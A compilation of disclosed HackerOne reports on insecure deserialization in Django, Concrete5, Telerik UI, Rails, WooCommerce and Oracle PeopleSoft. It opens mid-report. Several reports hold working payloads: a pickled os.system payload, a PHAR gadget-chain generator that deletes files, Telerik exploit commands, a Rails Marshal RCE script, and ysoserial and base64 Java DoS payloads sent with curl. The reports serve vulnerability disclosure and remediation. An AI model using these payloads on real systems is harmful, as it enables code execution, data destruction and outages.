6. Run `UPDATE my_cache_table SET value = 'gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=' where rowid=2;` with the id of your row,
7. Reload the web page.
8. Observe command execution in the server logs.

Video PoC:
{F1532035}

`gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=` is a base64 version of pickled RCE payload:
```
class Pwner:
    def __reduce__(self):
        import os
        cmd = "whoami"
        return os.system, (cmd,)
```

## Reference
As a reference I'm leaving a very same issue in Flask: 
https://vulmon.com/vulnerabilitydetails?qid=CVE-2021-33026&scoretype=cvssv2

## Attack scenario:
1. Attacker gains an access to machine/container with cache instance.
2. Attacker now can run arbitrary code on machine with running Django server.

## Impact

RCE, full machine takeover

---

### [Arbitrary File delete via PHAR deserialization](https://hackerone.com/reports/921288)

- **Report ID:** `921288`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Concrete CMS
- **Reporter:** @reset
- **Bounty:** - usd
- **Disclosed:** 2021-10-20T16:24:54.512Z
- **CVE(s):** CVE-2021-40102

**Vulnerability Information:**

crayons :)

### Concrete5 Arbitrary File delete via PHAR deserialization

- Target: Concrete5
- Version: 8.5.4 (Latest at 2020. 07. 12) / PHP 7.2
- Credit: [WSP Lab](https://wsp-lab.github.io/)@KAIST
- Contact: reset@kaist.ac.kr



#### TL; DR

- An attacker can send an arbitrary input value in the is_dir() function, which causes a PHAR deserialization bug. By using this bug, `the attacker possible to exploit that deletes arbitrary files.`



### Background

- PHP Object Injection (PHP deserialization): When an attacker controls a serialized object that is passed into unserialize(), she can control the properties of the created object. This will then allow her the opportunity to hijack the flow of the application, by controlling the values passed into magic methods like __wakeup() [1].
- PHAR deserialization: The attack surface of the PHP deserialization vulnerability has been extended. With the parameter of filesystem function (`file_exists()`, `is_dir()`, etc.) under control, this method can be used with `phar://` pseudo-protocol to directly perform deserialization without relying on `unserialize()`[2].



### Bug analyzing

#### Endpoint

- Navigation: Dashboard => System&Settings => File Storage Location => Add Location

{F903876}



#### Bug flow

- When attackers add optional file storage locations at the endpoint, the server executes `validateStorageRequest()` method to validate the location path code, which is (a).

```php
- File: concrete/controllers/single_page/dashboard/system/files/storage.php
- Line: 131 ~ 148
    
    public function add()
    {
        $type = $this->validateStorageRequest(); // ................................................... (a)
        if (!$this->token->validate('add')) {
            $this->error->add($this->token->getErrorMessage());
        }
        if (!$this->error->has()) {
            $configuration = $type->getConfigurationObject();
            $configuration->loadFromRequest($this->request);
            $factory = $this->app->make(StorageLocationFactory::class);
            /* @var StorageLocationFactory $factory */
            $location = $factory->create($configuration, $this->request->request->get('fslName'));
            $location->setIsDefault($this->request->request->get('fslIsDefault'));
            $location = $factory->persist($location);
            $this->redirect('/dashboard/system/files/storage', 'storage_location_added');
        }
        $this->set('type', $type);
    }
```

- Next, the request that the attacker sent will be transported to validateRequest() as a parameter - (b).

```php
- File: concrete/controllers/single_page/dashboard/system/files/storage.php
- Line: 64 ~ 81
    
    protected function validateStorageRequest()
    {
        $val = $this->app->make('helper/validation/strings');
        $type = Type::getByID($this->request->get('fslTypeID'));
        if ($type === null) {
            $this->error->add(t('Invalid type object.'));
        } else {
            $e = $type->getConfigurationObject()->validateRequest($this->request); // ................... (b)
            if (is_object($e)) {
                $this->error->add($e);
            }
        }
        if (!$val->notempty($this->request->request->get('fslName'))) {
            $this->error->add(t('Your file storage location must have a name.'));
        }
 
        return $type;
    }
```

- Finally, `is_dir` function will be executed by user input without any sanitization.

```php
- File: concrete/src/File/StorageLocation/Configuration/LocalConfiguration.php
- Line: 75 ~ 102
    
    public function validateRequest(\Concrete\Core\Http\Request $req)
    {
        $app = Application::getFacadeApplication();
        $e = $app->make('error');
        $data = $req->get('fslType');
        $fslID = $req->get('fslID');
        $locationHasFiles = false;
        $locationRootPath = null;
        if (!empty($fslID)) {
            $location = $app->make(StorageLocationFactory::class)->fetchByID($fslID);
            if (is_object($location)) {
                $locationHasFiles = $location->hasFiles();
                $locationRootPath = $location->getConfigurationObject()->getRootPath();
            }
        }
        $this->path = $data['path'];
        if (!$this->path) {
            $e->add(t("You must include a root path for this storage location."));
        } elseif (!is_dir($this->path)) { // ......................................................... (c)
            $e->add(t("The specified root path does not exist."));
        } elseif ($this->path == '/') {
            $e->add(t('Invalid path to file storage location. You may not choose the root directory.'));
        } elseif ($locationHasFiles && $locationRootPath !== $this->path) {
            $e->add(t('You can not change the root path of this storage location because it contains files.'));
        }

        return $e;
    }

```

- In other words, an attacker can send an arbitrary path, which is executed with the parameter of is_dir(). Even if the path has "phar://" schema.



### Exploit 

- To exploit this bug, I will use POP (Property Oriented Programming) technique [3].

- To chain gadgets, I found 3 nice gadgets to delete some files.

  

#### Gadgets

- Gadget #1. VolatileDirectory::__destruct()
  - It will naturally execute below codes when PHP terminated. Because, __destruct is magic method that invoked when class destructed.

```php
// File: concrete/src/File/Service/VolatileDirectory.php
// Class: VolatileDirectory
// Line: 75 ~ 84
    
    public function __destruct()
    {
        if ($this->path !== null) {
            try {
                $this->filesystem->deleteDirectory($this->path); // ....................... (d)
            } catch (Exception $foo) {
            }
            $this->path = null;
        }
    }
```

- Gadget #2. Filesystem::deleteDirectory()

```php
// File: concrete/vendor/illuminate/filesystem/Filesystem.php
// Class: Filesystem
// Line: 473 ~ 502

     public function deleteDirectory($directory, $preserve = false)
     {
         if (! $this->isDirectory($directory)) {
             return false;
         }
 
         $items = new FilesystemIterator($directory);
 
         foreach ($items as $item) {
             // If the item is a directory, we can just recurse into the function and
             // delete that sub-directory otherwise we'll just delete the file and
             // keep iterating through each file until the directory is cleaned.
             if ($item->isDir() && ! $item->isLink()) {
                 $this->deleteDirectory($item->getPathname());
             }
 
             // If the item is just a file, we can go ahead and delete it since we're
             // just looping through and waxing all of the files in this directory
             // and calling directories recursively, so we delete the real path.
             else {
                 $this->delete($item->getPathname()); // ............................ (e)
             }
         }
 
         if (! $preserve) {
             @rmdir($directory);
         }
 
         return true;
     }
```

- Gadget #3. Filesystem::delete()

```php
// File: concrete/vendor/illuminate/filesystem/Filesystem.php
// Class: Filesystem
// Line: 148 ~ 165

     public function delete($paths)
     {
         $paths = is_array($paths) ? $paths : func_get_args();
 
         $success = true;
 
         foreach ($paths as $path) {
             try {
                 if (! @unlink($path)) { // ........................................ (f)
                     $success = false;
                 }
             } catch (ErrorException $e) {
                 $success = false;
             }
         }
 
         return $success;
     }
```



#### Exploit code

#### Stage #1. Make PHAR file to exploit.

```php
// Input: None
// Output: concrete5_exploit.png

<?php
// Gadgets
namespace Illuminate\Filesystem{
  class Filesystem{}
}
namespace Concrete\Core\File\Service{ 
  class VolatileDirectory{
    protected $filesystem;
    protected $path;
    function __construct(){
      $this->filesystem = new \Illuminate\Filesystem\Filesystem;
      $this->path = "/var/www/html/phar_exploit/test_dir";
      // Directory that including some files. (Attacker can set any path.)
    }
  }
}

// Generate phar file to exploit
namespace{
  $output_path = __DIR__;
  $exploit_file = $output_path . "/concrete5_exploit.phar";
  $phar = new Phar($exploit_file);
  $phar->startBuffering();
  $phar->setStub("<?php __HALT_COMPILER();");
  
  $payload = new \Concrete\Core\File\Service\VolatileDirectory;
  $phar->setMetadata($payload);
  
  $phar->addFromString("dummy.txt", "DUMMY");
  $phar->stopBuffering();

  // Change file extension PHAR to PNG. (for bypassing file upload restrictions)
  $changing_file_name = "concrete5_exploit.png";
  $changing_internal_full_path = $output_path . "/" . $changing_file_name;
  rename($exploit_file, $changing_file_name);
}


// Run below command to make PHAR file.
// php generate_exploit.php
```

#### Stage #2. Upload PHAR file.

- Fortunately, concrete5 supports file upload featue.
  - Navigation: Dashboard => Files => File Manager => Upload Files

{F903877}

{F903878}

#### Stage #3. Triggering PHAR deserialization bug.

- Navigation: Dashboard => System&Settings => File Storage Location => Add Location
- Payload: `phar://./application/files/6815/9449/9442/concrete5_exploit.png`

{F903879}



#### Exploit Before / After

- Before (Directory: /var/www/html/phar_exploit/test_dir)

{F903880}

- After (Directory)

{F903881}

- test1/2/3.txt were deleted by exploit.



### Patch

- To avoid PHAR deserialization bug,  you should not fully trust the user's input. You can sanitize a user's input in various ways.

  1. Occurring an error when the user enters "phar://".

     ```php
     <?php
     // input_path is phar://path/to/file
     if(strpos($input_path, "phar://") !== FALSE){
         trigger_error("Detected phar wrapper!", E_USER_ERROR); // phar detected.
     }
     else{
         is_dir($input_path);
     }
     ?>
     ```

  2. Forcing path setting as a prefix.

     ```php
     <?php
     // input_path is phar://path/to/file
     $sanitized_path = "/" . $input_path;
     // sanitized_path is /phar://path/to/file
     // Therefore, PHP wouldn't recognize that file is phar wrapped file.
     is_dir($sanitized_path);
     ?>
     ```



### Reference

[1] https://blog.usejournal.com/diving-into-unserialize-phar-deserialization-98b1254380e9

[2] https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066

[3] Stefan Esser, Utilizing Code Reuse/Return Oriented Programming in PHP Web Application Exploits, Blackhat  USA 2010

## Impact

- Attacker could delete any files on the server.
- This report is just one example of using this bug.
- In other words, if an attacker using other gadgets to exploit (POP technique) this bug, It will potentially generate various exploits including XSS and SQL injection, remote code execution, and so on.

---

### [Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)](https://hackerone.com/reports/1174185)

- **Report ID:** `1174185`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-06-03T16:27:14.424Z
- **CVE(s):** CVE-2017-11317, CVE-2019-18935

**Vulnerability Information:**

**Description:**
https://██████/██████████/Telerik.Web.UI.WebResource.axd?type=rau is vulnerable to CVE-2017-11317 and CVE-2019-18935, allowing an attacker to upload arbitrary files and gain remote code execution on the underlying system.

## References
https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui

## Impact

An attacker can execute code on the vulnerable server, allowing an attacker to gain a foothold and exfiltrate data. Depending on the security posture of the underlying system, an attacker may be able to escalate privileges or laterally move to other systems within the network using this access.

## System Host(s)
████

## Affected Product(s) and Version(s)
Telerik UI Version ███

## CVE Numbers
CVE-2017-11317, CVE-2019-18935

## Steps to Reproduce
## Verify the Upload Handler is Registered
First, confirm the file upload handler is registered by issuing the following request:
```bash 
curl -sk https://██████████/██████████/Telerik.Web.UI.WebResource.axd?type=rau
```
You should see the following response:
```
{ "message" : "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly." }
```


## Version Identification
Next, you will need to install `RAU_crypto` (https://github.com/bao7uo/RAU_crypto) and use it to submit upload requests with known vulnerable versions until finding the correct version. After `RAU_crypto` has been installed, you can use the following script (with the attached _versions.txt_ file):
```bash
echo 'test' > testfile.txt
for VERSION in $(cat versions.txt); do
            echo -n "$VERSION: "
                python3 RAU_crypto.py -P '█████' "$VERSION" testfile.txt https://█████████/█████/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo
        done
```

This uploads a file (in this case, `testfile.txt`) to the `█████` directory on the target server. The contents of my `testfile.txt` simply included the word "test".

The script should eventually identify a vulnerable version (`████████`), indicating the file upload succeeded and showing an encrypted blob of data related to the uploaded file:
```bash
█████████: {"fileInfo":{"FileName":"RAU_crypto.bypass","ContentType":"text/html","ContentLength":5,"DateJson":█████ }
```

## Compiling a Test Payload
Now that we know we can upload a file to the target, we can attempt to exploit the deserialization vulnerability. To do this, we can compile and upload a DLL that causes the server to sleep for 10 seconds before responding:
```c
#include <windows.h>
#include <stdio.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
        Sleep(10000);  // Time interval in milliseconds.
    return TRUE;
}
```

As a .NET application will only load an assembly once with a given name, the dll from my test will only successfully sleep the server on the first exploit. I have compiled and attached an unused dll for testing purposes if desired (if not, just follow the steps from the link in the references section).

## Exploitation
Now that we have our test payload ready, we can use the attached _CVE-2019-18935.py_ script to upload and execute the dll.

```bash
python3 CVE-2019-18935.py -u https://███████/███/Telerik.Web.UI.WebResource.axd?type=rau -v ██████████ -f '███' -p sleep_2020070207013954_amd64.dll
```

> *Note: I'm having trouble getting the server to sleep with the crafted `.dll`. The files are getting uploaded, but do not seem to be causing the server to sleep as expected. It is 02:30 AM here at the moment so I am heading to bed but will update tomorrow with more info in the comments, and will end up self closing if I can't get execution.*

## Suggested Mitigation/Remediation Actions
Update TelerikUI to the latest (or a patched) version.

---

### [Unsafe deserialization in Nexus Repository helm plugin](https://hackerone.com/reports/917843)

- **Report ID:** `917843`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Central Security Project
- **Reporter:** @c0d3p1ut0s
- **Bounty:** - usd
- **Disclosed:** 2020-09-10T22:07:32.356Z
- **CVE(s):** CVE-2020-15871

**Summary (team):**

A remote code execution vulnerability (CVE-2020-15871) has been discovered in Nexus Repository Manager 3.

A user with the right permissions can run arbitrary code as the user running the Nexus Repository Manager server. Alternatively, an attacker could trick a user with the right permissions into running arbitrary code as the user running the Nexus Repository Manager server. We have fixed the issue so that the remote code execution is no longer possible. This advisory provides the pertinent information needed to properly address this vulnerability, along with the details on how to reach us if you have any further questions or concerns.

This vulnerability was identified by an external researcher and has been verified by our security team. We are not aware of any active exploits taking advantage of this issue. However, we strongly encourage all users of Nexus Repository Manager 3 to immediately take the steps outlined in this advisory.

We are highly recommending all instances of Nexus Repository Manager be upgraded to version 3.25.1 or later. The latest version of Nexus Repository Manager 3 can be downloaded from:

https://help.sonatype.com/repomanager3/download

For detailed information on upgrade, please see:

https://support.sonatype.com/hc/en-us/articles/115000350007

---

### [Remote Code Execution via CVE-2019-18935](https://hackerone.com/reports/913695)

- **Report ID:** `913695`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2020-08-13T18:11:22.998Z
- **CVE(s):** CVE-2017-11317, CVE-2019-18935

**Vulnerability Information:**

**Summary:**
The website at https://█████████/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau is vulnerable to CVE-2017-11317 and CVE-2019-18935, allowing an attacker to upload arbitrary files and gain remote code execution on the underlying system.

## Step-by-step Reproduction Instructions

1. Browse to https://█████/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau. You will see the following message confirming that the file upload handler is registered:
`{ "message" : "RadAsyncUpload handler is registered succesfully, however, it may not be accessed directly." }`
2. From here on out I used the write-up at https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui for reference.
3. With a slight modification to the script in the BishopFox write-up, I was able to determine the software version:

```
echo 'test' > testfile.txt
for VERSION in $(cat versions.txt); do
            echo -n "$VERSION: "
                python3 RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt https://█████/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo
        done
```
The `versions.txt` file I used has been attached to this report for ease of replication.
4. As shown in the results, the version is vulnerable to CVE-2017-11317 and I was able to successfully upload the `testfile.txt`.
██████████
5. Next, on a Windows system with Visual Studio installed, compile a dll using `build_dll.bat` as shown in the BishopFox article.
6. Using `python3 CVE-2019-18935.py -u https://████/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607 -f 'C:\Windows\Temp' -p <your_created_dll>.dll`, if you compiled using the PoC in the article you should be able to make the server hang for around 10 seconds. 
7. Once the sleep is over, the server should respond with a similar message as follows: `[*] Response time: 12.34 seconds` showing the server is vulnerable to CVE-2019-18935.
8. At this point you can upload a reverse shell payload, but I feel the sleep PoC is good enough to prove RCE.

## Product, Version, and Configuration (If applicable)
Telerik UI 2016.2.607

## References
https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui
https://github.com/bao7uo/RAU_crypto
https://github.com/noperator/CVE-2019-18935
https://hackerone.com/reports/838196

## Suggested Mitigation/Remediation Actions
Follow recommended fix actions at https://www.telerik.com/support/kb/aspnet-ajax/details/allows-javascriptserializer-deserialization

## Impact

Remote Code Execution/Total system compromise.

---

### [Untrusted strings that are cache fetched with raw option are automatically marshal loaded](https://hackerone.com/reports/413388)

- **Report ID:** `413388`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Ruby on Rails
- **Reporter:** @dylan-ts
- **Bounty:** - usd
- **Disclosed:** 2020-05-26T22:38:29.197Z
- **CVE(s):** CVE-2020-8165

**Vulnerability Information:**

This vulnerability effects application code that caches a string from an untrusted source using the `raw: true` option. For example, vulnerable application code might looks something like the following

```ruby
body = Rails.cache.fetch(key, raw: true, expires_in: ttl) do
  res = Net::HTTP.get_response(remote_uri)
  res.value # raise on HTTP error
  res.body
end
```

where `res.body` represents the untrusted string in the example above.  The below script shows that an untrusted string in the Marshal format will be deserialized when read using `raw: true`.

```ruby
require 'rails/all'

untrusted_string = Marshal.dump(:sym)

cache = ActiveSupport::Cache::MemCacheStore.new('localhost')
cache.delete("demo")
data = cache.fetch("demo", raw: true) { untrusted_string }
p data # "\x04\b:\bsym"
data = cache.fetch("demo", raw: true)
p data # :sym
```

This vulnerability appears to have been around for a long time, so would affect all currently supported versions of rails. I've tested with the earliest and latest supported rails version, 4.2.10 and 5.2.1 and both are affected.

The vulnerability affects both MemCacheStore and RedisCacheStore cache backends that are a part of rails, but cache stores developed outside of rails could also be vulnerable. For instance, the memcached_store has the same vulnerability as a result of replicating the behaviour of MemCacheStore.

I've attached patches to fix MemCacheStore and RedisCacheStore on master.  I believe the MemCacheStore patch can be backported, since Dalli uses memcached's flags to tag keys that need marshal loading (since [Dalli version 0.11.0](https://github.com/petergoldstein/dalli/blob/master/History.md#0110)) so can avoid unmarshalling raw strings.  However, backporting RedisCacheStore could cause backwards compatibility problems with application code that writes and reads a cache key with a different raw option value, so I've included a patch to deprecate that usage in rails 5.2.

## Impact

As has been demonstrated in the past, Marshal.load of an untrusted string can lead to remote code execution when done in rails without any reliance on application code.

The following script demonstrates that this is still the case and shows that a generic exploit payload can be used.

```ruby
require 'erb'
require 'rails/all'

remote_code = <<-RUBY
puts 'HACKED'
RUBY

erb = ERB.allocate
erb.instance_variable_set(:@src, remote_code)
erb.instance_variable_set(:@lineno, 0)
deprecation = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result)
exploit_data = Marshal.dump(deprecation)

obj = Marshal.load(exploit_data)
obj.is_a?(ActiveSupport::Cache::Entry)
```

So a generic exploit payload could be provided to applications to try to find if the application stores and fetches raw strings from the cache.

---

### [Remote Code Execution via Insecure Deserialization in Telerik UI ](https://hackerone.com/reports/838196)

- **Report ID:** `838196`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sw33tlie
- **Bounty:** - usd
- **Disclosed:** 2020-05-07T16:54:15.813Z
- **CVE(s):** CVE-2017-11317, CVE-2019-18935

**Vulnerability Information:**

Hello,
I found an outdated version of Telerik Web UI (v2016.2.607.40) at the following URL: https://███/Telerik.Web.UI.WebResource.axd?type=rau.
This means that we can achieve full RCE by chaining two different CVEs: CVE-2017-11317, which allows us to upload arbitrary files on the server, and CVE-2019-18935, which is a deserialization vulnerability.

First of all, the only thing that I tried to prove that I had successfully achieved code execution was making the server sleep for 10 seconds.
No data was compromised.

Steps to reproduce
---------------------
The steps that I followed are thoroughly described in this blog post: <https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui>.
Here's a quick summary:
- Download the files in the attachments
- Make sure you have pycryptodome installed (pip3 install pycryptodome)
- Run the following command: `python3 CVE-2019-18935.py -u https://█████/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607.40 -f 'C:\Windows\Temp' -p sleep_042020163752,45_amd64.dll`
- The `sleep_042020160430,40_amd64.dll` is supposed to Sleep(10). This will make the server hang for roughly ten seconds, and after that you will get a response like this one: `[*] Response time: 12.88 seconds`
- The exploit worked.

Things to note
---------------------
I had to edit the original exploit code provided in the aforementioned blog post (https://github.com/noperator/CVE-2019-18935) because I noticed that when uploading the .dll file the server added a .tmp at the end of the file name.
That's why the original code was failing to exploit the deserialization part.
I added `+ '.tmp'` at the end of line 95 and after that it worked just fine.

A DLL file can only work once. This means that to test the vulnerability again a new DLL has to be compiled.
For this reason I provided several DLLs in the attachments so you don't have to compile them (especially because a windows machine with Visual Studio installed is required).

I didn't upload a reverse shell because I thought it was not a great idea, but if needed I could do it.

How to fix
---------------------
Just upgrade Telerik for ASP.NET AJAX to R3 2019 SP1 (v2019.3.1023) or later.

## Impact

Full **Remote Code Execution** on the vulnerable server.

---

### [Authenticated Code Execution through Phar deserialization in CSV Importer as Shop manager in WooCommerce](https://hackerone.com/reports/403083)

- **Report ID:** `403083`
- **Severity:** High
- **Weakness:** Deserialization of Untrusted Data
- **Program:** Automattic
- **Reporter:** @simonscannell
- **Bounty:** - usd
- **Disclosed:** 2019-12-19T14:26:02.746Z
- **CVE(s):** -

**Vulnerability Information:**

This vulnerability is based on the following exploitation technique:

https://blog.ripstech.com/2018/new-php-exploitation-technique/

It is easier to explain this vulnerability by having watched the PoC first:
https://www.youtube.com/watch?v=mr3bAOIUwd4

Here is what's happening:

1. Since a valid phar file needs o be uploaded to the server (the extension doesn't matter) I upload the poc.jpg via the media uploader
2. I begin the Import process with a valid CSV file
3.  The importer asks if I am sure that I want to run the import on these files
4. I confirm and modify the  POST parameter to my phar:// wrapper and deserialize the file
5. The PHP code executes

The source of the vulnerability within the source code lies in the /woocommerce/includes/import/class-wc-product-csv-importer.php:

```
	public function __construct( $file, $params = array() ) {
		$default_args = array(
			'start_pos'        => 0, // File pointer start.
			'end_pos'          => -1, // File pointer end.
			'lines'            => -1, // Max lines to read.
			'mapping'          => array(), // Column mapping. csv_heading => schema_heading.
			'parse'            => false, // Whether to sanitize and format data.
			'update_existing'  => false, // Whether to update existing items.
			'delimiter'        => ',', // CSV delimiter.
			'prevent_timeouts' => true, // Check memory and time usage and abort if reaching limit.
			'enclosure'        => '"', // The character used to wrap text in the CSV.
			'escape'           => "\0", // PHP uses '\' as the default escape character. This is not RFC-4180 compliant. This disables the escape character.
		);

		$this->params = wp_parse_args( $params, $default_args );
		$this->file   = $file;

		if ( isset( $this->params['mapping']['from'], $this->params['mapping']['to'] ) ) {
			$this->params['mapping'] = array_combine( $this->params['mapping']['from'], $this->params['mapping']['to'] );
		}

		$this->read_file();
	}

	/**
	 * Read file.
	 */
	protected function read_file() {
		$handle = fopen( $this->file, 'r' ); // @codingStandardsIgnoreLine.

		if ( false !== $handle ) {
			$this->raw_keys = version_compare( PHP_VERSION, '5.3', '>=' ) ? fgetcsv( $handle, 0, $this->params['delimiter'], $this->params['enclosure'], $this->params['escape'] ) : fgetcsv( $handle, 0, $this->params['delimiter'], $this->params['enclosure'] ); // @codingStandardsIgnoreLine

...
```

As can be seen, the constructor calls read_file, which in turn calls fopen without any checks, which leads to the deserialization of the Phar object.

I recommend to check the file parameter and see if it actually is a CSV file before calling fopen on it.

I have attached the poc.jpg that worked for my PHP version.

## Impact

I only displayed the contents of the /etc/passwd file in the PoC video. However, since I can execute arbitrary PHP code, a complete compromise of the WordPress installation is possible. If an attacker can gain access to a Shop manager account, he can easily and without restrictions take over the server.

---

### [Remote Code Execution (RCE) in a DoD website](https://hackerone.com/reports/329376)

- **Report ID:** `329376`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:51:48.128Z
- **CVE(s):** CVE-2017-10366

**Vulnerability Information:**

SUMMARY:
====================

The DoD **`https://██████/psc/EXPROD_1/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].

PROOF OF CONCEPT
====================

For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (testing1.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for testing1.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).

For more details about this payload used, see [2].

**Attached is a video detailing the PoC.**

**Generating the payload:** for generate the payload I used the tool ysoserial.
```
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package –DskipTests
$ cd target
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://testing1.jexboss.info > payload
```

**Sending the payload to a vulnerable server:**
```
curl https://█████████/monitor/EXPROD_1 --data-binary @payload -k
```
After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
	
**BIND logs:**
```
23-Mar-2018 18:51:09.183 queries: info: client █████████#53133: query: testing1.jexboss.info IN A -ED (10.0.1.202)
```

**Denial Of Service (DoS)**

This vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:

**Generating payload for Denial of Service (DoS)[3]:**
```
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Sending:**
```
curl https://███████/monitor/EXPROD_1 --data-binary @payload_dos -k
```
This will make your service stop immediately and show the following error in the logs:
```Exception in thread "Thread-2" java.lang.OutOfMemoryError: Java heap space```

MITIGATION
====================

The best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path /monitor should be rejected/blocked! 
Also, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!

REFERENCES:
====================
[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366
[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html

Best Regards, 
João Filho Matos Figueiredo, @joaomatosf

## Impact

This vulnerability allows:
1) Remote Code Execution (**RCE**)
2) Denial of Service (DoS)

---

### [Remote Code Execution (RCE) in a DoD website](https://hackerone.com/reports/329399)

- **Report ID:** `329399`
- **Severity:** Critical
- **Weakness:** Deserialization of Untrusted Data
- **Program:** U.S. Dept Of Defense
- **Reporter:** @joaomatosf
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:50:55.421Z
- **CVE(s):** CVE-2017-10366

**Vulnerability Information:**

SUMMARY:
====================

The DoD **`https://███/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].

PROOF OF CONCEPT
====================

For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (dod.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for dod.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).

For more details about this payload used, see [2].

**Attached is a video detailing the PoC.**

**Generating the payload:** for generate the payload I used the tool ysoserial.
```
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package –DskipTests
$ cd target
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info > payload
```

**Sending the payload to a vulnerable server:**
`curl https://█████/psc/EXPROD/ --data-binary`@payload`-k`

After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
	
**BIND logs:**
```
23-Mar-2018 18:29:54.523 queries: info: client ███#5691: query: dod.jexboss.info IN A -ED (10.0.1.202)
```

**Denial Of Service (DoS)**

This vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:

**Generating payload for Denial of Service (DoS)[3]:**
```
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Sending:**
`curl https://██████████/psc/EXPROD/ --data-binary`@payload_dos`-k`

This will make your service stop immediately and show the following error in the logs:
```Exception in thread "Thread-2" java.lang.OutOfMemoryError: Java heap space```

MITIGATION
====================

The best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path **/monitor** should be rejected/blocked! 
Also, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!

REFERENCES:
====================
